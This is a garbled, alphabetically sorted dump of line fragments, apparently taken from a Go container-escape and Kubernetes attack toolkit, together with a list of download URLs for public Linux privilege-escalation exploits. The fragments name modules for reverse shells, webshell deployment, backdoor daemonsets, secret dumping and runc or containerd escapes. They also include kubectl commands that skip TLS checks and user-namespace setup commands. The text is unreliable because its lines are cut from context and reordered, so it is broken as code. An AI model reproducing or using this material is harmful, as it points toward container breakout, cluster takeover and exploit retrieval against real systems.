section: Mainline kernel protection mechanisms:
sed -n 's/.
select {
semaphore.Weighted
server)}
shellPayload := args[1]
shimClient := shimapi.NewShimClient(client)
size=40)](https://github.com/404tk) 
size=40)](https://github.com/kingkaki) 
size=40)](https://github.com/wywwzjj) 
size=40)](https://github.com/yeahx) 
sock := args[0]
sock)
sockname := string(b)
sort.Strings(tmplist)
spec:
spti' /proc/cpuinfo
src-url: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
src-url: http://legalhackers.com/exploits/tomcat-RH-root.sh
src-url: http://legalhackers.com/exploits/tomcat-rootprivesc-deb.sh
src-url: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
src-url: http://stealth.openwall.net/xSports/clown-newuser.c
src-url: http://vulnfactory.org/exploits/full-nelson.c
src-url: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
src-url: https://bugzilla.novell.com/attachment.cgi
src-url: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
src-url: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
src-url: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
src-url: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
src-url: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
src-url: https://cyseclabs.com/exploits/vnik_v1.c
src-url: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c
src-url: https://gist.githubusercontent.com/taviso/fe359006836d6cd1091e/raw/32fe8481c434f8cad5bcf8529789231627e5074c/raceabrt.c
src-url: https://gist.githubusercontent.com/wbowling/9d32492bd96d9e7c3bf52e23a0ac30a4/raw/959325819c78248a6437102bb289bb8578a135cd/cve-2018-5333-poc.c
src-url: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
src-url: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/raw/master/2009/CVE-2009-2698/katon.c
src-url: https://github.com/bcoles/local-exploits/raw/master/CVE-2019-18862/exploit.ldpreload.sh
src-url: https://github.com/initstring/dirty_sock/archive/master.zip
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/34421.tar.gz
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40053.zip
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9435.tgz
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9436.tgz
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9574.tgz
src-url: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/9641.tar.gz
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
src-url: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
src-url: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
src-url: https://github.com/stealth/troubleshooter/raw/master/straight-shooter.c
src-url: https://haxx.in/files/dirtypipez.c
src-url: https://jon.oberheide.org/files/team-edward.py
src-url: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
src-url: https://legalhackers.com/exploits/CVE-2016-9566/nagios-root-privesc.sh
src-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2011-2921/ktsuss-lpe.sh
src-url: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
src-url: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
src-url: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
src-url: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
src-url: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh
src-url: https://www.openwall.com/lists/oss-security/2015/12/01/1/1
src-url: https://www.openwall.com/lists/oss-security/2017/01/27/7/1
src-url: https://www.qualys.com/2017/05/30/cve-2017-1000367/linux_sudo_cve-2017-1000367.c
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_dynamic.c
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap.c
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
src-url: https://www.qualys.com/2017/06/19/stack-clash/linux_offset2lib.c
src-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
srcDecoder := mahonia.NewDecoder(encoding)
startTime := time.Now()
stderr
stdout
str := buf.String()
str = str[:1000]
strconv.Itoa(found)
subSysName := args[1]
subSystemName = ci.ControllerLst
subgroupName
subjects:
success := false
success = true
successStr string
switch args[0] {
switch c {
switch len(args) {
switch method {
switch runtime.GOOS {
switch schedule {
switch stat.Family {
switch stat.Type {
switch strings.ToLower(scriptType) {
switch strings.ToUpper(args[1]) {
switch token {
switch tokenFlag {
switch tokenPath {
sysPtraceCapMask != 0
syscall.Stat_t)
syscall.SysProcAttr{
sysctl -w kernel.unprivileged_userns_clone=1
sysctl:.
t %s 
t NAME 
t%-10s
t%-13s
t%-16s
t%s - %s
t%s Metadata API available in %s
t%s webshell saved in %s
t3fZ
tAdded capability list: %s
tCap decode: 0x%s = %s
tCellScreen.Fini()
tDocs: %s
tabwriter.Debug)
tags_array[@]}
tar.gz
target = args[0]
target = args[1]
target = defaultTarget
targetFile := args[0]
targetIP := args[2]
targetMountPoint = mi.MountPoint
targetPort := args[3]
targetServiceAccount := args[1]
task := taskAutoEscapeS{}
tconnection
temp := map[string]struct{}{}
temp[item] = struct{}{}
testGroup := map[string]testCase{
testing.T) {
tests := []testArgsCase{
tfound containerd-shim socket in: %s
thin release
time.Sleep(3 
time.Sleep(timeout)
timeout   time.Duration
timeout := time.Duration(conf.TCPScannerConf.Timeout) 
timeout := time.Duration(timeoutMS) 
tlistening port: https://%s:9444
tlocalAddr
tls.Config
tls.Config{InsecureSkipVerify: true}
tls.Config{}
tlsConfig := 
tlsConfig.Certificates = []tls.Certificate{cert}
tlsConfig.RootCAs = pool
tnow you can make your own request to takeover the entire k8s cluster with 
to := 0
to = from
token := args[0]
token := strings.TrimSpace(opts.Token)
token = args[2]
token = args[3]
token = strings.TrimSpace(token)
token)
tokenFlag := args[0]
tokenPath := args[0]
tomcat
tot 
tot := 0
tpid
tremoteAddr
triggerSegmentFault()
trun: kubectl --server=https://%s:9444 --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A
tsend codes or system command via post param: %s=(codes)
tstatus
ttcp
tudp
twI54=
type Affinity struct {
type BaseExploit struct {
type CDKRuntimeError struct {
type Cap struct {
type CapDacReadSearch struct{ base.BaseExploit }
type CgroupInfo struct {
type Cluster struct {
type ClusterInfo struct {
type Condition struct {
type Container struct {
type ContainerState struct {
type ContainerStateRunning struct {
type ContainerStateTerminated struct {
type ContainerStateWaiting struct {
type ContainerStatus struct {
type Context struct {
type ContextInfo struct {
type Convert struct {
type DINDAttackDeployS struct{ base.BaseExploit }
type DINDAttackS struct{ base.BaseExploit }
type DockerRemoteAPIS struct{ base.BaseExploit }
type EnvVar struct {
type EtcdGetToken struct{ base.BaseExploit }
type EtcdRequestOption struct {
type ExploitCgroupS struct{ base.BaseExploit }
type ExploitInterface interface {
type ExploitUnprivUserNS struct{ base.BaseExploit }
type FieldsV1 struct {
type FileScanS struct{ base.BaseExploit }
type FromTo struct {
type K8SPodSecurityPolicy struct{ base.BaseExploit }
type K8sBackDoorDaemonsetS struct{ base.BaseExploit }
type K8sContainer struct {
type K8sContainerPort struct {
type K8sCronJobDeployS struct{ base.BaseExploit }
type K8sGetSATokenViaCreatePodS struct{ base.BaseExploit }
type K8sMitmClusteripS struct{ base.BaseExploit }
type K8sObjectMeta struct {
type K8sPod struct {
type K8sPodSpec struct {
type K8sRequestOption struct {
type K8sSecretsDumpS struct{ base.BaseExploit }
type K8sShadowApiServerS struct{ base.BaseExploit }
type KubeConfig struct {
type KubeletExec struct{ base.BaseExploit }
type Level uint8
type LevelLogger struct {
type ManagedField struct {
type MatchField struct {
type Metadata struct {
type MountInfo struct {
type NodeAffinity struct {
type NodeSelectorTerm struct {
type OwnerReference struct {
type PidInject struct{ base.BaseExploit }
type Pod struct {
type PodIP struct {
type PodList struct {
type PodSpec struct {
type PodStatus struct {
type Port struct {
type PortScanner struct {
type RegistryBruteS struct{ base.BaseExploit }
type Resources struct{}
type Result struct {
type SecurityContext struct {
type Sysctl struct {
type TCPScannerConfS struct {
type TESTExploit struct{ base.BaseExploit }
type TaskInterface interface {
type Toleration struct {
type User struct {
type UserInfo struct {
type VarLogEscape struct{ base.BaseExploit }
type Wrapper struct {
type cgroupDevicesExploitS struct{ base.BaseExploit }
type cloudAPIS struct {
type containerdShimPwnS struct{ base.BaseExploit }
type dockerRuncPwnS struct{ base.BaseExploit }
type dumpK8sConfigmapS struct{ base.BaseExploit }
type isioHeader struct {
type istioCheckS struct{ base.BaseExploit }
type kv struct {
type lxcfsRWCgroup struct{ base.BaseExploit }
type lxcfsRWS struct{ base.BaseExploit }
type mountDeviceS struct{ base.BaseExploit }
type mountProcfsExpS struct{ base.BaseExploit }
type response struct {
type reverseShellS struct{ base.BaseExploit }
type sensitiveFileRules struct {
type serviceProbeS struct{ base.BaseExploit }
type taskAutoEscapeS struct{}
type testArgsCase struct {
type testCase struct {
type textScanRules struct {
type webShellDeployS struct{ base.BaseExploit }
u0026
u0026 apt install -y netcat
u1BRV06dPaLfLCaT7fUTJLp5r04x7iNw=
uJTEuzIV7utqNXPKtqVkwqQByF8Qxa0ahqoSToCIw3Rl1EQ2mDTViD0TZJq4UU1r
ubuntu
ubuntu:$6$
ucurl
udpBufSize = 64 
uid(2) manipulation (including fsuid). 
uname -r
unix.Utsname{}
unset IFS
unshare
unshare -UrmC bash
url := api 
url := args[0]
url = api 
url = url 
urlErr = nil
usage() {
usage: netcat [-l] [-v] [-p port] [-n tcp]
useTime := int64(endTime.Sub(startTime).Seconds() 
userArg := os.Args[1]
usernameInput := args[1]
usernameList := normalizeInput(usernameInput)
util.MountInfo) bool {
util.PrintOrignal(lines[i])
utsInfo := 
v=CH7S5rE3j8w
var (
var AnonymousFlag = false
var Args docopt.Opts
var BannerContainer = fmt.Sprintf(
var BannerContainerTpl = BannerHeader 
var BannerHeader = fmt.Sprintf(
var BannerServerless = BannerHeader 
var BannerTitle = 
var CAPStringsList = []string{
var CAP_AUDIT_CONTROL = 30
var CAP_AUDIT_READ = 37
var CAP_AUDIT_WRITE = 29
var CAP_BLOCK_SUSPEND = 36
var CAP_BPF = 39
var CAP_CHECKPOINT_RESTORE = 40
var CAP_CHOWN = 0
var CAP_DAC_OVERRIDE = 1
var CAP_DAC_READ_SEARCH = 2
var CAP_FOWNER = 3
var CAP_FSETID = 4
var CAP_IPC_LOCK = 14
var CAP_IPC_OWNER = 15
var CAP_KILL = 5
var CAP_LEASE = 28
var CAP_LINUX_IMMUTABLE = 9
var CAP_MAC_ADMIN = 33
var CAP_MAC_OVERRIDE = 32
var CAP_MKNOD = 27
var CAP_NET_ADMIN = 12
var CAP_NET_BIND_SERVICE = 10
var CAP_NET_BROADCAST = 11
var CAP_NET_RAW = 13
var CAP_PERFMON = 38
var CAP_SETFCAP = 31
var CAP_SETGID = 6
var CAP_SETPCAP = 8
var CAP_SETUID = 7
var CAP_SYSLOG = 34
var CAP_SYS_ADMIN = 21
var CAP_SYS_BOOT = 22
var CAP_SYS_CHROOT = 18
var CAP_SYS_MODULE = 16
var CAP_SYS_NICE = 23
var CAP_SYS_PACCT = 20
var CAP_SYS_PTRACE = 19
var CAP_SYS_RAWIO = 17
var CAP_SYS_RESOURCE = 24
var CAP_SYS_TIME = 25
var CAP_SYS_TTY_CONFIG = 26
var CAP_WAKE_ALARM = 35
var CloudAPI = []cloudAPIS{
var DefaultLevel = INFO
var DefaultPathEnv = []string{
var DockerDefaultCaps = []string{
var EnableSysPtraceCap = enableSysPtraceCap
var Exploits map[string]ExploitInterface
var GitCommit string
var K8sMitmPayloadDeploy = 
var K8sMitmPayloadSvc = 
var KernelExploitScript = 
var LinuxCommandChecklist = []string{
var M = shimapi.CreateTaskRequest{
var MaybeSuccessfulStatuscodeList = []int{
var ScanFileTextConf = textScanRules{
var SensitiveFileConf = sensitiveFileRules{
var TCPScannerConf = TCPScannerConfS{
var Tasks map[string]TaskInterface
var addCaps []string
var apiVersion string
var buf bytes.Buffer
var buffer strings.Builder
var capTextList []string
var cginfo []CgroupInfo
var cmd 
var command = shellPath
var config struct {
var configJson = 
var content []byte
var content string
var cronJobConfig = 
var d = []byte(content)
var devices []string
var dockerAPIHttpPostData = 
var ectlBanner = 
var err error
var exploitSuccess = false
var filterString string
var flag bool
var found = -1
var handleFd = -1
var hostPath string
var inputList []string
var k8sBackdoorDaemonsetJson = 
var k8sGetSATokenPodConf = 
var kcurlBanner = 
var kubectlBinary []byte
var lines []string
var mountedDirs []string
var opt = EtcdRequestOption{}
var opts = K8sRequestOption{}
var output bytes.Buffer
var pInt 
var pidStr string
var podCgroupPath string
var podData = 
var releaseAgentPath string
var request 
var resp string
var response 
var result = response{}
var result []string
var results []
var ret []string
var scheduleExpr string
var server string
var setuidfiles []string
var shell = 
var shell string
var stdoutStr string
var subSystemName string
var syses []string
var targetDir string
var targetMountPoint string
var taskRandString = util.RandString(4)
var taskRandString = util.RandString(6)
var testcase = map[string]string{
var tmplist []string
var token string
var tokenErr error
var tokenPath string
var urlErr error
ver.
ver1[@]}
ver2[@]}
verComparision() {
version = 'cdk_v0.10'
version() {
versionPattern := regexp.MustCompile(
vi.RunVendorVi()
wExME=
wg := sync.WaitGroup{}
wg.Add(1)
wget
while true
wht='
workdir=((/[
writeHandle.Write([]byte(payload))
writer.Flush()
x /cmd
x /exp.sh
x cdk
x {}'.format(CDK.REMOTE_HOST_PATH))
x {}'.format(SELFBUILD_K8S.REMOTE_HOST_PATH))
x86$ ]] 
x86_64$ ]] 
xobZo=
yAqZuZjsqh/z
yellow='
you may not use this file except in compliance with the License.
zMLi60iA8Vv6Ksmxu/1UDYcXs4uQLJ
zip$ 
} else if ans {
} else if err != nil {
} else {
}(conn)
